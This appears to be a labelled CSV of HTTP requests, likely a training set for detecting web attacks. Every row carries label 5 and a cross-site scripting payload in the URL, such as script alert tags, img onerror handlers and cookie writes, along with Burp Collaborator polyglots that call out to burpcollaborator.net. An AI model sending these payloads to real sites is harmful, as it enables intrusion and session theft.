id,method,user_agent,url,refer,body,lable
2206,GET,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36",/pan/wp-content/plugins/wp-symposium/get_album_item.php?size=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
714,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36",/_layouts/scriptresx.ashx?culture=en-us&name=SP.JSGrid.Res&rev=laygpE0lqaosnkB4iqx6mA%3D%3D&sections=All<script>alert(12345)</script>z,,"GET /_layouts/scriptresx.ashx?culture=en-us&name=SP.JSGrid.Res&rev=laygpE0lqaosnkB4iqx6mA%3D%3D&sections=All<script>alert(12345)</script>z HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
98,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/acquisitions.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f0uvi8kiym7si15er2v84g7nvxm3hrdf56t0gq4fX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/ftp,"GET /ftp/acquisitions.md?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2f0uvi8kiym7si15er2v84g7nvxm3hrdf56t0gq4fX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
25,GET,python-requests/2.18.4,/index.php?c=waterfall&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&version=2.0.2.1002&a=index&c=waterfall&category=internal&channel=shouzhu&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&src=gaia_app_result_input&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&version=2.0.2.1002&ls=shouzhu&channel=shouzhu&ls=shouzhu?&category=internal&src=gaia_app_result_input%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
152,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/runtime.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fbq5t4ve9iiotxga2y64fcij6txzrnubm2awxmlbX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1,http://121.4.111.58:3000/,"GET /runtime.js?javascript%3a%2f*%3c%2fscript%3e%3cimg%2fonerror%3d'-%2f%22%2f-%2f%20onmouseover%3d1%2f-%2f[%60*%2f[]%2f[(new(Image)).src%3d(%2f%3b%2f%2b%2fbq5t4ve9iiotxga2y64fcij6txzrnubm2awxmlbX%3b.burpcollaborator.net%2f).replace(%2f.%3b%2fg%2c[])]%2f%2f'src%3d%3e=1 HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
51,GET,python-requests/2.18.4,/index.php?c=waterfall&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&src=gaia_app_result_input&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&version=2.0.2.1002&a=index&c=waterfall&category=internal&gaia_app=1&mso_searcher=srv62.safe.bjdt.qihoo.net&mso_searcher_port=6471&q=h%e7%8e%84%e5%b9%bb+&src=gaia_app_result_input&srcg=gaia_app&userid=3de30b27e1f577b8d5260036731616f9&version=2.0.2.1002&ls=shouzhu&channel=shouzhu&ls=shouzhu?&category=internal&channel=shouzhu%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
3675,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/forgetpwd.cgi?__mode=step2&__mode=%22%3E%3Cimg%20src=1%20onerror=javascript:alert%28205%29%3E&cancel=Cancel&save=Submit&username=,,,5
2845,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
3029,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000918),/addressbook/index.php?surname=<script>alert('Vulnerable')</script>,,"<!--#include virtual=""/index.jsp""-->",5
1780,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extmail/default/c0zrmfzc.kspx?<script>cross_site_scripting.nasl</script>,,,5
3511,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/cgi-bin/profil.php?id=1%20<script>foo</script>,,,5
696,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/'""()&%25<acx><ScRiPt%20>Oskc(9628)<%2fScRiPt>/sysjs.asp",http://114.251.10.167/,"GET /'""()&%25<acx><ScRiPt%20>Oskc(9628)<%2fScRiPt>/sysjs.asp HTTP/1.1 Referer: http://114.251.10.167/ Cookie: ASPSESSIONIDSCDSDRDS=DHAFENDBHMIPDKGDLCNHIJAB Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.167 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
3503,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/scripts/oh2cb4wl.htm?<script>document.cookie=%22testafzq=4149;%22</script>,,,5
2747,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
1340,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),<script>document.cookie=%22testqbli=447;%22</script>,,,5
1511,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000716),/article.cfm?id=1'<script>alert(document.cookie);</script>,,"<!--#include virtual=""/index.jsp""-->",5
732,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36","/zcfg/xq.asp?ID=142'""()%26%25<acx><ScRiPt%20>i5yF(9300)</ScRiPt>",http://114.251.10.167/,"GET /zcfg/xq.asp?ID=142'""()%26%25<acx><ScRiPt%20>i5yF(9300)</ScRiPt> HTTP/1.1 Referer: http://114.251.10.167/ Cookie: ASPSESSIONIDSCDSDRDS=DHAFENDBHMIPDKGDLCNHIJAB Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Encoding: gzip,deflate Host: 114.251.10.167 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36 Connection: Keep-alive  ",5
509,GET,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",/src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search,,"GET /src/search.php?mailbox=INBOX&what=x&where=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&submit=Search HTTP/1.1 Host: 117.23.61.212:443 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 Connection: close Accept: */* Accept-Language: en Accept-Encoding: gzip  ",5
243,GET,Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; LCJB; rv:11.0) like Gecko,/_static/src/browser/media/pwa-icon-192.png/%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E,,,5
366,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/2y1kcmm0q9wk57it6xc6k9rx1o7ivnjfa31volcaX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/2y1kcmm0q9wk57it6xc6k9rx1o7ivnjfa31volcaX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/  ",5
3649,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/c0zrmfzc.idc?<script>cross_site_scripting.nasl</script>,,,5
429,GET,python-requests/2.18.4,/Activity/edit?start_time=2016-07-05+00%3A00%3A00&image=88888&url=http://www.hacker.org/&is_popup=0&sequence=0&detail=%3Cp%3E%E6%A0%B9%E6%8D%AE%E4%BA%A7%E5%93%81%E9%9C%80%E6%B1%82%EF%BC%8C%E2%80%9C%E4%B8%BB%E6%92%AD%E8%AF%84%E7%BA%A7%E7%94%B3%E8%AF%B7%E2%80%9D%E7%9A%84%E9%9C%80%E6%B1%82%E6%9C%89%E4%B8%AA%E5%B0%8F%E8%B0%83%E6%95%B4%EF%BC%9A%3C%2Fp%3E%3Cp%3E1.+%E7%94%B3%E8%AF%B7%E6%B5%81%E7%A8%8B%E8%B0%83%E6%95%B4%EF%BC%9A%E4%B9%8B%E5%89%8D%E5%85%88%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%E5%86%8D%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%EF%BC%8C%E6%94%B9%E4%B8%BA%E5%85%88%E9%80%89%E6%8B%A9%E3%80%90%E6%A0%87%E7%AD%BE%E3%80%91%E5%86%8D%E8%BE%93%E5%85%A5%E3%80%90%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E3%80%91%EF%BC%882%E4%B8%AA%E9%A1%BA%E5%BA%8F%E9%A2%A0%E5%80%92%E4%B8%8B%EF%BC%89%E3%80%82%3C%2Fp%3E%3Cp%3E2.+%E4%BF%A1%E6%81%AF%E4%BF%9D%E5%AD%98%E6%9C%BA%E5%88%B6%EF%BC%9A%E7%94%A8%E6%88%B7%E6%AF%8F%E5%AE%8C%E6%88%901%E4%B8%AA%E7%94%B3%E8%25&id=1&end_time=2016-12-31+00%3A00%3A00%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
391,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/au8s8ui8mhss1fe1258eghn5xw3qrpfh65xxkn8cX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/au8s8ui8mhss1fe1258eghn5xw3qrpfh65xxkn8cX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
15,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/n2q7i1xtc9mhwx30nvywvarwangg4es6juamxcl1X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/n2q7i1xtc9mhwx30nvywvarwangg4es6juamxcl1X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
25,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/266mmg18goqw0c7fra2bzpvbe2kv8m2au1iy5otdX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak,http://121.4.111.58:3000/ftp,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/266mmg18goqw0c7fra2bzpvbe2kv8m2au1iy5otdX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/package.json.bak HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
3816,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000731),/<script>alert('Vulnerable')</script>.shtm,,"<!--#include virtual=""/index.jsp""-->",5
3506,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/60teglc6.jsp?<script>document.cookie=%22testlqex=3433;%22</script>,,,5
795,GET,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0,/tjcme/userLogin.do;jsessionid=5DD9C3614FD497C8CD4EC0E4EDF1CFC7?forwardPath=%2FdragCate.do%3Fid%3D766&password=8&username=8%22%27%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%20%3Cscript%3Ealert(42873)%3C%2Fscript%3E,,"GET /tjcme/userLogin.do;jsessionid=5DD9C3614FD497C8CD4EC0E4EDF1CFC7?forwardPath=%2FdragCate.do%3Fid%3D766&password=8&username=8%22%27%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%20%3Cscript%3Ealert(42873)%3C%2Fscript%3E HTTP/1.1 Host: www.tjcme.org User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1  ",5
102,GET,python-requests/2.18.4,/index.php?c=waterfall&wid=aa965c8464798100c6d01ba4e60b98ad&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&=88888&srcg=gaia_ios&q=%e6%94%af%e4%bb%98%e5%ae%9d%e8%ba%ab%e4%bb%bd%e4%bf%a1%e6%81%af%e6%80%8e%e4%b9%88%e4%bf%ae%e6%94%b9&src=gaia_ios_sug%3C/script%3E%3Cimg%20src=1%20onerror=alert(42873)%3E,,,5
3030,GET,Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000902),/cleartrust/ct_logon.asp?CTLoginErrorMsg=<script>alert(1)</script>,,"<!--#include virtual=""/index.jsp""-->",5
3520,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/default/index.php?page=send&cid=%3cscript%3ealert(%27dcpportal_sql.nasl%27)%3c%2fscript%3e,,,5
3956,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/2m9wwi9l.cfc?<script>cross_site_scripting.nasl</script>,,,5
4220,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/index.php/community/?%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
81,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/435e2gkga56kg2dmqjflmy68uz0tokl8dz1wonccX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_linux_amd_64.url,http://121.4.111.58:3000/ftp/quarantine,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/435e2gkga56kg2dmqjflmy68uz0tokl8dz1wonccX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/juicy_malware_linux_amd_64.url HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/quarantine  ",5
4316,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
56,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/yaciqc54kkus48bbv6673lz7iyoscj57xylpdc30sX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp/,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/yaciqc54kkus48bbv6673lz7iyoscj57xylpdc30sX%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp/  ",5
122,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/cp5u3wdahjnuwh93x73gbji7syytmkac10ssfi37X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e,http://121.4.111.58:3000/ftp,"GET /ftp/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/cp5u3wdahjnuwh93x73gbji7syytmkac10ssfi37X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
3985,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/extman/cgi/changepwd.cgi?__mode=step2&cancel=Cancel&cancel=<script>alert(102);</script>&save=Submit&username=,,,5
221,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36",/TZmtR%3CTZmtR%3ETZmtR%27TZmtR%22TZmtR/TZmtR-TZmtR?hl=%3C%2FBODY%3E%3CimG+id%3D%27lsYwocuK%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBODY%3E&pref=%3C%2FBodY%3E%3CiMg+id%3D%27AkgiGSvX%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CbOdY%3E&pval=%3C%2FBOdY%3E%3CiMG+id%3D%27aMRBTbsp%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdy%3E&q=%3C%2FBody%3E%3CimG+id%3D%27xsDAtZZc%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDY%3E&sa=%3C%2FbODy%3E%3CiMG+id%3D%27zddIXMuA%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBODY%3E&usg=%3C%2FBOdY%3E%3CIMg+id%3D%27zCpmBsmk%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBOdy%3E&ust=%3C%2FboDY%3E%3CiMG+id%3D%27TYcxFOfC%27+src%3D1+onerror%3D%27prompt%281%29%27%3E%3CBoDy%3E,,,5
2758,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/admin-font-editor/css.php?size=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
4758,GET,Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 360shuke_scanner,/wp-content/plugins/simpel-reserveren/edit.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,,,5
118,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",/javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0kliyk8yc7iir54rsvy467dvnmthhd55wttgj48X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/acquisitions.md,http://121.4.111.58:3000/ftp,"GET /javascript%3a/*%3c/script%3e%3cimg/onerror%3d'-/%22/-/%20onmouseover%3d1/-/[%60*/[]/[(new(Image)).src%3d(/%3b/%2b/0kliyk8yc7iir54rsvy467dvnmthhd55wttgj48X%3b.burpcollaborator.net/).replace(/.%3b/g%2c[])]//'src%3d%3e/acquisitions.md HTTP/1.1 Host: 121.4.111.58:3000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en-US,en-GB;q=0.9,en;q=0.8 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Connection: close Cache-Control: max-age=0 Referer: http://121.4.111.58:3000/ftp  ",5
4605,GET,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),/mfjxiwg6.htm?<script>document.cookie=%22testidvs=9253;%22</script>,,,5
